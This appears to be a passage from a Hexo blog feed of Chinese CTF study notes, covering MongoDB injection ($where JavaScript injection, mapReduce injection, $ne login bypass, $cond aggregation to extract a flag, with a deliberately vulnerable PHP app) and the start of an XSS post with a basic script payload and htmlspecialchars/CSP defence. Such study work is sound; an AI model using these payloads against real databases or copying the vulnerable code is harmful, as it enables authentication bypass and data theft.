class="hljs-string">&#x27;&#x27;</span>&#125;]&#125;<br></code></pre></div></td></tr></table></figure><h3 id="JavaScript-注入"><a href="#JavaScript-注入" class="headerlink" title="JavaScript 注入"></a><strong>JavaScript 注入</strong></h3><p>我们知道 MongDB Server 是支持 JavaScript 语言的，这样给开发人员带来了很多非常方便的使用方法，但也是因为它本身的灵活性，造成了 JavaScript 注入。这里有个例子是一个祥云杯的一个题，那个是用node.js实现的一个mongodb查询，当时是可以使用nodejs报错机制来将密码带出来。</p><p>查询语句如下</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">let</span> docs = <span class="hljs-keyword">await</span> User.$where(<span class="hljs-string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="hljs-subst">$&#123;token.toString()&#125;</span>&quot;`</span>).exec()<br></code></pre></div></td></tr></table></figure><p>这里可以使用如下payload进行报错。</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span class="hljs-string">&quot;||(()=&gt;&#123;throw Error(this.password)&#125;)()==&quot;</span>admin<br></code></pre></div></td></tr></table></figure><h5 id="where-操作符"><a href="#where-操作符" class="headerlink" title="$where 操作符"></a><strong>$where 操作符</strong></h5><p>在 MongoDB 中 $where 操作符是可以执行 JavaScript 语句的，在 MongoDB 2.4 之前，通过 $where 操作符使用<code>map-reduce</code>、<code>group</code>命令可以访问到 mongo shell 中的全局函数和属性。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$function</span> = <span class="hljs-string">&quot;function() &#123;if(this.uname == &#x27;<span class="hljs-subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="hljs-subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Query(<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;$where&#x27;</span> =&gt; <span class="hljs-variable">$function</span><br>));<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;executeQuery(<span class="hljs-string">&#x27;test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;toArray();<br></code></pre></div></td></tr></table></figure><p>MongoDB&lt;2.4之前可以访问到全局属性</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">?username=<span class="hljs-string">&#x27;||1) return &#123;&#x27;</span>username<span class="hljs-string">&#x27;: tojson(db.getCollectionNames()), &#x27;</span>password<span class="hljs-string">&#x27;: &#x27;</span>hacked<span class="hljs-string">&#x27;&#125;&#125;//&amp;password=1</span><br></code></pre></div></td></tr></table></figure><p>这里也存在nosql的万能密码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">?username=<span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-number">1</span>&amp;pwd=<span class="hljs-number">1</span><br>?username=<span class="hljs-number">1</span>&amp;pwd=admin<span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br></code></pre></div></td></tr></table></figure><h4 id="mapReduce"><a href="#mapReduce" class="headerlink" title="mapReduce"></a><strong>mapReduce</strong></h4><p>看一下官方文档给的例子</p><p><img src="https://img-blog.csdnimg.cn/24aea38e18414b5dbc2452ae94c9fd76.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>Map 函数和 Reduce 函数可以使用 JavaScript 来实现，使得 MapReduce 的使用非常灵活和强大。但是同样也带来了隐患，假设有这样的一个业务场景，数据库中存储了一个<code>store</code>集合，有一系列商品的名称、价格和数量，我们想得到相同商品的价格或者数量的总和，代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">require_once __DIR__ . <span class="hljs-string">&quot;/vendor/autoload.php&quot;</span>;<br>$param = $_POST[<span class="hljs-string">&#x27;param&#x27;</span>];<br>$collection = (<span class="hljs-keyword">new</span> MongoDB\Client)-&gt;test-&gt;stores;<br>$map = <span class="hljs-string">&quot;function() &#123;</span><br><span class="hljs-string">        for (var i = 0; i &lt; this.items.length; i++) &#123;</span><br><span class="hljs-string">      emit(this.name, this.items[i].$param);    &#125;</span><br><span class="hljs-string">        &#125;&quot;</span>;<br>$reduce = <span class="hljs-string">&quot;function(name, sum) &#123; return Array.sum(sum); &#125;&quot;</span>;<br>$opt = <span class="hljs-string">&quot;&#123; out: &#x27;totals&#x27; &#125;&quot;</span>;<br>$results = $collection-&gt;mapReduce($map, $reduce, $out);<br><br>这里map中emit第一个参数为需要分组的字段名，第二个参数为需要进行统计的字段名<br>reduce函数参数<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reduce</span>(<span class="hljs-params">key, values</span>)</span>&#123; <span class="hljs-comment">// 统计字段处理 &#125;</span><br>key： 指分组字段（emit的param1）对应的值；<br>values：指需要统计的字段（emit的param2）值组成的数组。<br></code></pre></div></td></tr></table></figure><p>该代码应该在<code>$param</code>给定的字段上求和，但是这同样给了攻击者可乘之机，如果<code>$param</code>是这样：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">a);&#125;&#125;,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">kv</span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; &#125;, &#123; <span class="hljs-attr">out</span>: ‘x’ &#125;);<br>db.injection.insert(&#123;<span class="hljs-attr">success</span>:<span class="hljs-number">1</span>&#125;); <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>db.stores.mapReduce(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123; &#123; emit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>那么在 MongoDB 中就相当于执行了下面这条语句：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">db.stores.mapReduce(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.items.length; i++) &#123;<br>emit(<span class="hljs-built_in">this</span>.name, <span class="hljs-built_in">this</span>.items[i].a);<br>&#125;<br>&#125;,<br><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">kv</span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; &#125;, &#123; <span class="hljs-attr">out</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;);<br>db.injection.insert(&#123;<span class="hljs-attr">success</span>:<span class="hljs-number">1</span>&#125;); <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>db.stores.mapReduce(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123; &#123; emit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>); &#125; &#125;,<br><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">name, sum</span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">Array</span>.sum(sum); &#125;, &#123; <span class="hljs-attr">out</span>: <span class="hljs-string">&#x27;totals&#x27;</span> &#125;);<span class="hljs-string">&quot;</span><br></code></pre></div></td></tr></table></figure><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>和sql盲注区别不大</p><h1 id="操作实例"><a href="#操作实例" class="headerlink" title="操作实例"></a>操作实例</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&quot;/vendor/autoload.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">auth</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>    <span class="hljs-variable">$collection</span> = (<span class="hljs-keyword">new</span> MongoDB\Client(<span class="hljs-string">&#x27;mongodb://localhost:27017/&#x27;</span>))-&gt;test-&gt;users;<br>    <span class="hljs-variable">$raw_query</span> = <span class="hljs-string">&#x27;&#123;&quot;username&quot;: &quot;&#x27;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&#x27;&quot;, &quot;password&quot;: &quot;&#x27;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>;<br>    <span class="hljs-variable">$document</span> = <span class="hljs-variable">$collection</span>-&gt;findOne(json_decode(<span class="hljs-variable">$raw_query</span>));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$document</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$document</span>-&gt;password)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user</span> = auth(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user</span> = auth(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span>) &#123;<br>        setcookie(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>        setcookie(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span> == <span class="hljs-literal">true</span>): <span class="hljs-meta">?&gt;</span><br>    Welcome!<br>    &lt;div&gt;<br>        Group most common news by<br>        &lt;a href=<span class="hljs-string">&quot;?filter=<span class="hljs-subst">$category</span>&quot;</span>&gt;category&lt;/a&gt; |<br>        &lt;a href=<span class="hljs-string">&quot;?filter=<span class="hljs-subst">$public</span>&quot;</span>&gt;publicity&lt;/a&gt;&lt;br&gt;<br>    &lt;/div&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$filter</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filter&#x27;</span>];<br>        <span class="hljs-variable">$collection</span> = (<span class="hljs-keyword">new</span> MongoDB\Client(<span class="hljs-string">&#x27;mongodb://localhost:27017/&#x27;</span>))-&gt;test-&gt;news;<br>        <span class="hljs-variable">$pipeline</span> = [<br>            [<span class="hljs-string">&#x27;$group&#x27;</span> =&gt; [<span class="hljs-string">&#x27;_id&#x27;</span> =&gt; <span class="hljs-string">&#x27;$category&#x27;</span>, <span class="hljs-string">&#x27;count&#x27;</span> =&gt; [<span class="hljs-string">&#x27;$sum&#x27;</span> =&gt; <span class="hljs-number">1</span>]]],<br>            [<span class="hljs-string">&#x27;$sort&#x27;</span> =&gt; [<span class="hljs-string">&#x27;count&#x27;</span> =&gt; -<span class="hljs-number">1</span>]],<br>            [<span class="hljs-string">&#x27;$limit&#x27;</span> =&gt; <span class="hljs-number">5</span>],<br>        ];<br>        <span class="hljs-variable">$filters</span> = [<br>            [<span class="hljs-string">&#x27;$project&#x27;</span> =&gt; [<span class="hljs-string">&#x27;category&#x27;</span> =&gt; <span class="hljs-variable">$filter</span>]]<br>        ];<br>        <span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;aggregate(array_merge(<span class="hljs-variable">$filters</span>, <span class="hljs-variable">$pipeline</span>));<br>    <span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filter</span>)): <span class="hljs-meta">?&gt;</span><br>        <span class="hljs-meta">&lt;?php</span><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$category</span>) &#123;<br>                    printf(<span class="hljs-string">&quot;%s has %d news&lt;br&gt;&quot;</span>, <span class="hljs-variable">$category</span>[<span class="hljs-string">&#x27;_id&#x27;</span>], <span class="hljs-variable">$category</span>[<span class="hljs-string">&#x27;count&#x27;</span>]);<br>            &#125;<br>        <span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">else</span>: <span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])): <span class="hljs-meta">?&gt;</span><br>        Invalid username <span class="hljs-keyword">or</span> password<br>    <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br>    &lt;form action=<span class="hljs-string">&#x27;/&#x27;</span> method=<span class="hljs-string">&quot;POST&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>    &lt;/form&gt;<br>    &lt;h2&gt;News&lt;/h2&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$collection</span> = (<span class="hljs-keyword">new</span> MongoDB\Client(<span class="hljs-string">&#x27;mongodb://localhost:27017/&#x27;</span>))-&gt;test-&gt;news;<br>        <span class="hljs-variable">$cursor</span> = <span class="hljs-variable">$collection</span>-&gt;find([<span class="hljs-string">&#x27;public&#x27;</span> =&gt; <span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cursor</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$news</span>) &#123;<br>            printf(<span class="hljs-string">&quot;%s&lt;br&gt;&quot;</span>, <span class="hljs-variable">$news</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>这里第一步永真绕过,payload为。文章中用得<code>&quot;$ne&quot;=null</code>但我本地不对可能是php版本得问题</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/mongo/test_mongo.php?username=1&amp;password=&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;:null&#125;, &quot;username&quot;:&quot;admin</span><br></code></pre></div></td></tr></table></figure><p>输出为</p><p><img src="https://img-blog.csdnimg.cn/372db5c3313c40c8a192b4228294f7e3.png" alt="在这里插入图片描述"></p><p>第二步漏洞在<code>aggregate</code>方法</p><p>filter 参数里可以填 <code>category</code>展示目录 <code>text</code>展示内容 <code>title</code>展示标题，但是都限制了5条。</p><p>代码里是用的 MongoDB 聚合函数<code>aggregate</code>，下面这张图也是来自官方文档，解释了<code>aggregate</code>函数的执行过程：</p><p><img src="https://img-blog.csdnimg.cn/0683249c7df14e87ae36aacadd54991d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>使用<code>aggregate</code>聚合函数时，在里面是可以使用条件判断语句的。在 MongoDB 中<code>$cond</code>表示if判断语句，匹配的符号使用<code>$eq</code>，连起来为<code>[$cond][if][$eq]</code>，当使用多个判断条件时重复该语句即可。</p><p>官方文档列出的<code>$cond</code>的用法： $project可以指定输出需要查询字段</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">db.inventory.aggregate(<br>   [<br>      &#123;<br>         $project:<br>           &#123;<br>             item: 1,<br>             discount:<br>               &#123;<br>                 $cond: &#123; if: &#123; $gte: [ &quot;$qty&quot;, 250 ] &#125;, then: 30, else: 20 &#125;<br>               &#125;<br>           &#125;<br>      &#125;<br>   ]<br>)<br></code></pre></div></td></tr></table></figure><p>现在我们的目的是：如果<code>$category</code>的值是 flag，那么就输出<code>$title</code>的内容，否则还是原样输出<code>$catagory</code>，照着上面的例子写成 MongoDB shell 的形式就是</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">db.news.aggregate(<br>   [<br>      &#123;<br>         $project:<br>           &#123;<br>             category:<br>               &#123;<br>                 $cond: &#123; <span class="hljs-attr">if</span>: &#123; <span class="hljs-attr">$eq</span>: [ <span class="hljs-string">&quot;$category&quot;</span>, <span class="hljs-string">&quot;flags&quot;</span> ] &#125;, <span class="hljs-attr">then</span>: $title, <span class="hljs-attr">else</span>: $category &#125;<br>               &#125;<br>           &#125;<br>      &#125;<br>   ]<br>)<br></code></pre></div></td></tr></table></figure><p>转换成 PHP 数组形式传入 filter 参数：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">?filter[$cond][<span class="hljs-keyword">if</span>][$eq][]=flags&amp;filter[$cond][<span class="hljs-keyword">if</span>][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][<span class="hljs-keyword">else</span>]=$category<br></code></pre></div></td></tr></table></figure><p>转换成<code>raw_query</code>的形式：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&#123;<br>    <span class="hljs-string">&quot;category&quot;</span>:<br>    &#123;<br>     <span class="hljs-string">&quot;$cond&quot;</span>:<br>     &#123;<br>      <span class="hljs-string">&quot;if&quot;</span>:<br>      &#123;<br>          <span class="hljs-string">&quot;$eq&quot;</span>: [ <span class="hljs-string">&quot;$category&quot;</span>, <span class="hljs-string">&quot;flags&quot;</span> ]<br>      &#125;,<br>      <span class="hljs-string">&quot;then&quot;</span>: <span class="hljs-string">&quot;$title&quot;</span>,<br>      <span class="hljs-string">&quot;else&quot;</span>: <span class="hljs-string">&quot;$category&quot;</span><br>     &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>var_dump(json_decode(raw_query))</code>即为：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">object(stdClass)#4 (1) &#123;<br>  [<span class="hljs-string">&quot;category&quot;</span>]=&gt;<br>  object(stdClass)#3 (1) &#123;<br>    [<span class="hljs-string">&quot;$cond&quot;</span>]=&gt;<br>    object(stdClass)#2 (3) &#123;<br>      [<span class="hljs-string">&quot;if&quot;</span>]=&gt;<br>      object(stdClass)#1 (1) &#123;<br>        [<span class="hljs-string">&quot;$eq&quot;</span>]=&gt;<br>        <span class="hljs-function"><span class="hljs-title">array</span>(<span class="hljs-params"><span class="hljs-number">2</span></span>)</span> &#123;<br>          [<span class="hljs-number">0</span>]=&gt;<br>          string(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;$category&quot;</span><br>          [<span class="hljs-number">1</span>]=&gt;<br>          string(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;flags&quot;</span><br>        &#125;<br>      &#125;<br>      [<span class="hljs-string">&quot;then&quot;</span>]=&gt;<br>      string(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;$title&quot;</span><br>      [<span class="hljs-string">&quot;else&quot;</span>]=&gt;<br>      string(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;$category&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>参考</p><p><a href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html">https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1602092">https://cloud.tencent.com/developer/article/1602092</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>xss</title>
+    <link href="/2021/09/16/2021-10-xss(1)/"/>
+    <url>/2021/09/16/2021-10-xss(1)/</url>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于xss得了解和熟悉感觉还是很少得，这次集中学习一下。</p><p>跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的</p><p>一个简单的 XSS 漏洞页面，没有对用户的输入进行过滤，就像这样：</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">&lt;form&gt;<br>    &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&lt;?php echo $_GET[&quot;name&quot;]; ?&gt;&quot; /&gt;<br>    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;<br>&lt;/form&gt;<br></code></pre></div></td></tr></table></figure><p>对于这样毫无过滤的页面，我们可以轻而易举的进行 XSS。</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">&quot;/&gt; &lt;script&gt;alert(0)&lt;/script&gt; &lt;!--<br></code></pre></div></td></tr></table></figure><p>但其实这种漏洞通常可以用<code>htmlspecialchars</code> 函数来过滤输入。</p><p><code>htmlspecialchars</code> 函数：将特殊字符转换为 HTML 实体。</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">&amp; (AND) =&gt; &amp;amp;<br>&quot; (双引号) =&gt; &amp;quot;<br>&#x27; (单引号) =&gt; &amp;#039;<br>&lt; (小于号) =&gt; &amp;lt; <br>&gt; (大于号) =&gt; &amp;gt;<br></code></pre></div></td></tr></table></figure><p>但是仅仅这样防御使不够的，还有各种输入手法，这里简单了解一下<code>CSP</code>防御机制，其实就是从浏览器层面来防御，而不是从代码中。</p><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>CSP 的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。</p><h3 id="csp结构"><a href="#csp结构" class="headerlink" title="csp结构"></a>csp结构</h3><p>两种方法可以启用 